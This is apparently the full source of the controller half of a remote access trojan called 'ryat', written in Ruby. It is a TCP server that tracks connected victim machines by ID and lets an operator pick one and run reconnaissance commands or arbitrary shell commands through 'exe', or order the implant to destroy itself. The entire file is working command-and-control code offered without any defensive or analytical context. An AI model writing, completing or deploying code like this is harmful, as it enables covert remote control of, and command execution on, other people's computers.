#!/usr/bin/env ruby

require 'socket'
require 'colorize'

def get_input(prompt = 'ryat>')
  print "#{prompt} "
  inp = $stdin.gets.chomp
end

class Server
  attr_accessor :client_count, :current_client, :clients

  def initialize(port)
    @client_count = 0
    @current_client = nil
    @clients = {}
    @server = TCPServer.new(port)
    @server.setsockopt(Socket::SOL_SOCKET, Socket::SO_REUSEADDR, true)
  end

  def run
    loop do
      begin
        connection = @server.accept
        client_id = client_count + 1
        puts "\nNew Connection => ID: #{client_id} IP: #{connection.peeraddr[3]} ".green

        client = ClientConnection.new(
          connection,
          connection.peeraddr[3],
          client_id
        )
        @clients[client_id] = client
        @client_count += 1
      rescue Exception => e
        puts e.message.red
        puts e.backtrace.join("\n").red
      end
    end
  end

  # Commented out for now, heartbeat seemed to have no effect
  #
  #def heartbeat
  #  # Attempt to identify if a client is closed and destroy it
  #  get_clients.each do |temp_client|
  #    if temp_client.connection.closed?
  #      destroy_client(temp_client.uid)
  #    end
  #  end
  #end

  def send_client(msg, client)
    begin
      client.connection.write(msg)
    rescue Exception => e
      puts e.message.red
      puts e.backtrace.join("\n").red
    end
  end

  def recv_client(client)
    begin
      len = client.connection.gets
      client.connection.read(len.to_i)
    rescue Exception => e
      puts "#{e.message} RECV".red
      return
    end
  end

  def select_client(id)
    begin
      self.current_client = @clients[id]
      raise NoMethodError if @current_client.nil?
      puts "Client #{id} selected".green
    rescue NoMethodError => e
      puts "Invalid id: #{id}\nEnter 'clients' to see available clients".red
    end
  end

  def unselect
    @current_client = nil
  end

  def destroy_client(id)
    begin
      client = @clients[id]
      raise NoMethodError if client.nil?
      if @current_client
        @current_client = nil if @current_client.uid == id
      end

      send_client('destroy', client)
      @clients.delete(id)
      puts "Client #{id} destroyed".red
    rescue NoMethodError => e
      puts "Invalid id: #{id}\nEnter 'clients' to see available clients".red
    end
  end

  def list_clients
    return 'No clients available'.red if @clients.empty?
    str = ''
    get_clients.each { |client| puts client }
    str
  end

  def get_clients
    conns = []
    @clients.each_value { |c| conns << c }
    conns
  end

  def help(general_cmds, client_cmds)
    puts "Server Commands:".green
    general_cmds.each { |gen| puts "- #{gen}" }
    puts "\nClient Commands:".green
    client_cmds.each { |cli| puts "- #{cli}" }
  end

  def hardexit
    print "Exit server and destroy all clients? [y/n]: "
    inp = $stdin.gets.chomp.downcase
    if inp == 'yes' || inp == 'y'
      get_clients.each { |client| send_client('destroy', client) }
      exit(0)
    end
  end

  def quit
    print "Exit server but keep clients active? [y/n]: "
    inp = $stdin.gets.chomp.downcase
    exit 0 if inp == 'yes' || inp == 'y'
  end
end

class ClientConnection
  attr_accessor :connection, :addr, :uid

  def initialize(connection, addr, uid)
    @connection = connection
    @addr = addr
    @uid = uid
  end

  def to_s
    result = "ID: #{@uid.to_s} IP: #{@addr.to_s}".green
  end
end

def start
  client_cmds = %w[
    ls exe sysinfo pwd pid ifconfig
  ]

  general_cmds = %w[
    select unselect clients help history destroy exit hardexit
  ]

  port = ARGV[0]
  port ||= 3200

  client = nil
  data = nil
  history = []
  server = Server.new(port)

  Thread.new { server.run }
  puts "Sever started on port #{port}".green

  loop do
    exec_cmd = nil
    if server.current_client.nil?
      input = get_input
    else
      input = get_input("ryat (Client #{server.current_client.uid})> ")
      exec_cmd = input
    end
    next if input.nil?
    history.push(input)
    cmd, action = input.split(' ')

    if client_cmds.include?(input) && server.current_client.nil?
      puts "Client specific command, select a client first (#{server.client_count} available)".red
      next
    end

    case cmd
    # Server/General Commands
    when 'select'
      server.select_client(action.to_i)
    when 'unselect'
      server.unselect
    when 'clients'
      puts server.list_clients
    when 'hardexit'
      server.hardexit
    when 'help'
      server.help(general_cmds, client_cmds)
    when 'history'
      history.each_with_index { |cmd, i| puts "#{i}: #{cmd}"}
    when 'destroy'
      server.destroy_client(action.to_i)
    when 'quit'
      server.quit
      next
    when 'exit'
      server.quit
      next
    when 'hardexit'
      server.hardexit
      next
    # Client Commands
    when 'sysinfo'
      server.send_client('sysinfo', server.current_client)
      data = server.recv_client(server.current_client)
    when 'pid'
      server.send_client('pid', server.current_client)
      data = server.recv_client(server.current_client)
    when 'ifconfig'
      server.send_client('ifconfig', server.current_client)
      data = server.recv_client(server.current_client)
    when 'pwd'
      server.send_client('pwd', server.current_client)
      data = server.recv_client(server.current_client)
    when 'exe'
      next if action.nil?
      server.send_client(input, server.current_client)
      data = server.recv_client(server.current_client)
    when 'ls'
      server.send_client('ls', server.current_client)
      data = server.recv_client(server.current_client)
    else
      puts "Unknown command: #{input}. Enter 'help' for available commands.".red
    end
    puts data unless data.nil?
    data = nil
  end
end

start()
